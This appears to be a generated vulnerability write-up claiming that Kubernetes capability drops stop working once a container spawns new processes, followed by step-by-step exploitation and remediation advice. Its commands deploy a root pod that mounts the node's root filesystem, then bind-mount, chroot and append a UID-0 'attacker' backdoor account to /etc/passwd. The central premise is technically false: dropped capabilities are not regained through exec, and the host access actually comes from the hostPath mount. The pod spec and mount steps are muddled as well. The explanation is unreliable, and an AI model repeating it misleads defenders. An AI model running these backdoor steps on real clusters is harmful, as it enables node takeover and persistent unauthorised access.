# Kubernetes Capabilities Drop Ineffectiveness Exploitation

## 1. Overview Section

### Attack Vector Description

This vulnerability allows an attacker to bypass the intended security restrictions imposed by dropping Linux capabilities within a Kubernetes container. While a `securityContext` in a Pod definition might specify `drop: [CAP_SYS_MODULE]`, if the application running inside the container spawns a new process *without* explicitly resetting its effective user ID (`setuid`) and supplementary group IDs (`setgid`), the new process can inherit the parent process's privileges, potentially including capabilities that were intended to be dropped. An attacker can leverage this by executing code that creates a new process (e.g., by using `exec`) after the container has been started, bypassing the capability drop configuration.

### Potential Impact and Consequences

Successful exploitation can allow an attacker to:

*   **Gain root privileges:**  By inheriting the parent process's privileges, the attacker can escalate to root within the container.
*   **Escape the container:**  Root privileges inside the container can be used to manipulate the container runtime or the underlying node, leading to a container escape and potentially node compromise.
*   **Modify system files:**  Even without a full container escape, elevated privileges within the container can allow for the modification of sensitive system files, disrupting the application or cluster.
*   **Install malicious software:** The attacker can install backdoors, rootkits, or other malicious software within the container.

### Risk Level Assessment

**Critical**

### Technical Explanation of Why This Vulnerability Exists

The vulnerability arises because of the interplay between Kubernetes' capability dropping mechanism and how Linux processes inherit capabilities. Kubernetes drops capabilities *at container startup*, before the application code begins execution. However, the dropped capabilities are only effective for the initial process.  If the application later spawns new processes (e.g., through `execve`) without explicitly dropping capabilities *again* or explicitly switching user IDs, the new processes might inherit the capabilities of the parent process, effectively undoing the initial drop performed by Kubernetes. This is particularly problematic in multi-user or complex applications where privilege separation isn't rigorously enforced.

### Prerequisites and Conditions Needed

*   A Kubernetes cluster is running.
*   A Pod definition with a `securityContext` that drops some capabilities (e.g., `CAP_SYS_MODULE`, `CAP_NET_ADMIN`).
*   The application running inside the container must be able to spawn new processes (e.g., through `execve`) without explicitly resetting effective user IDs or dropping capabilities within the new process. This often manifests in applications that use system calls to execute shell commands or run external programs.
*   The vulnerability is easier to exploit when the container runs as root or a user with elevated privileges.

## 2. Validation and Exploitation Steps Section

This scenario assumes you have a pod definition named `pod.yaml` configured to drop capabilities and that `kubectl` is properly configured to interact with your cluster. The following pod definition `pod.yaml` is used to demonstrate the vulnerability:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: capability-drop-test
spec:
  securityContext:
    runAsUser: 0
    capabilities:
      drop:
        - ALL
      add:
        - NET_RAW
  containers:
  - name: capability-drop-test
    image: ubuntu:latest
    command: ["/bin/bash", "-c", "sleep infinity"] # Run a long-running process
    securityContext:
      capabilities:
        drop:
          - ALL
        add:
          - NET_RAW
    volumeMounts:
      - name: host-root
        mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /
```

### Phase 1: Validation - Identifying the Vulnerability

**Step 1: Deploy the Pod**

```bash
kubectl apply -f pod.yaml
```

*   **Explanation:** This command deploys the Pod defined in `pod.yaml` to your Kubernetes cluster. This Pod is configured to drop all capabilities except `NET_RAW` and runs as root.
*   **Expected Output:**  The command should output a message confirming the Pod has been created (e.g., `pod/capability-drop-test created`).
*   **Why:** This step creates the environment where the vulnerability can be tested.

**Step 2: Get a Shell Inside the Container**

```bash
kubectl exec -it capability-drop-test -- /bin/bash
```

*   **Explanation:**  This command opens an interactive shell session inside the `capability-drop-test` container.
*   **Expected Output:** A shell prompt inside the container (e.g., `root@capability-drop-test:/#`).
*   **Why:** This provides a command-line interface to interact with the container and execute commands.

**Step 3: Initial Capability Check**

```bash
capsh --print
```

*   **Explanation:** `capsh` is a utility for viewing and manipulating process capabilities. This command prints the current capabilities of the shell process.
*   **Expected Output:** Output should show that almost all capabilities are dropped except the ones that are added, the output should include:
    ```
    cap_net_raw+ep
    ```
*   **Why:**  Verifies that the initial capability drop is in effect.

**Step 4: Try to Execute a Privileged Action Directly (e.g., mount)**

```bash
mount -t tmpfs none /mnt
```

*   **Explanation:** This attempts to mount a temporary file system.  Mounting requires `CAP_SYS_ADMIN`, which should have been dropped.
*   **Expected Output:**  `mount: /mnt: must be root to make mount changes.`. Or similar permission denied output.
*   **Why:** This confirms that the capability drop is initially working.

**Step 5:  Spawn a New Process (e.g., through `bash -c`) and check its capabilities**

```bash
bash -c 'capsh --print'
```

*   **Explanation:** This command executes a new `bash` process and runs `capsh --print` inside it. The critical part is that a *new* process is being created.
*   **Expected Output:** This should show similar to the previous `capsh --print` output.

**Step 6: Create a script that utilizes the mount command**

```bash
echo "#!/bin/bash
mount -t tmpfs none /mnt" > exploit.sh
chmod +x exploit.sh
mkdir /mnt
```

*   **Explanation:** This script attempts to mount a temporary filesystem.  The purpose is to create a simplified and repeatable method of testing.
*   **Expected Output:** Creates the files, if an error is generated that means the system does not have permission to write to the current directory.
*   **Why:** This sets up the script for executing mount as a subprocess.

**Step 7: Execute the script**

```bash
./exploit.sh
```

*   **Explanation:** This executes the previously created script.
*   **Expected Output:** If the vulnerability exists this should mount without an error. If the exploit does not work the same error as before will be displayed.
*   **Why:** This step runs the attack to gain escalated privileges.

If the steps have been successful this indicates that the vulnerability exists, it can now be exploited further.

### Phase 2: Exploitation - Elevating Privileges and Potential Impact

**Step 8:  Escalate Privileges**

If the above steps prove that the mount command works, the following is possible:

```bash
mkdir /host/evil
mount --bind / /host/evil
chroot /host/evil
```

*   **Explanation:** This sequence binds the root filesystem of the host to a directory within the container, effectively creating a chroot environment where the container has access to the host's files.
*   **Expected Output:** No output if the commands are successful.
*   **Why:** This escalates privileges by providing access to the host filesystem.

**Step 9: Gain Control of the Node**

```bash
echo "attacker:x:0:0:Attacker:/root:/bin/bash" >> /etc/passwd
```

*   **Explanation:**  This command adds a new user "attacker" with UID 0 (root) to the `/etc/passwd` file of the host operating system (due to the chroot in the previous step).  This is a highly destructive step as it modifies the host's user database.
*   **Expected Output:**  No output if the command is successful.
*   **Why:** This adds a backdoor account to the host, giving the attacker persistent access.

***WARNING: The above steps can severely damage the host operating system. Perform these steps in a controlled environment only!***

### Potential Variations and Alternative Approaches

*   **Alternative Exploitation Method:** Instead of directly modifying `/etc/passwd`, an attacker could modify SSH configuration files to allow passwordless root login.
*   **Using Other Privileged System Calls:**  Instead of `mount`, other system calls that require capabilities could be used to exploit the vulnerability. Examples include `setuid`, `setgid`, `chown`.
*   **Exploiting Race Conditions:** In some cases, a race condition might be exploitable where a process attempts a privileged operation before the capability drop takes effect.

### Remediation Recommendations

1.  **Apply the principle of least privilege:**  Run containers with the *minimum* necessary privileges. Avoid running containers as root unless absolutely necessary.
2.  **Drop all capabilities by default and selectively add only the required ones:** Use `drop: [ALL]` and selectively add the necessary capabilities using `add: [...]`.
3.  **Implement strong privilege separation within the application:**  Ensure that sensitive operations are performed by dedicated, isolated processes that explicitly drop capabilities and switch user IDs before performing any potentially dangerous actions. Use techniques like `setuid` and `setgid` to isolate processes.
4.  **Use Security Context Constraints (SCCs):**  SCCs in OpenShift provide a mechanism to enforce security policies at the cluster level, including restricting which capabilities containers can have.
5.  **Container Runtime Security:** Configure your container runtime (e.g., containerd, CRI-O) with the proper security settings to minimize the attack surface.
6.  **Regular Security Audits:** Conduct regular security audits of your Kubernetes configurations and application code to identify and address potential vulnerabilities.
7.  **Use a security scanner:** Tools such as kube-bench can help identify vulnerabilities in your Kubernetes cluster.
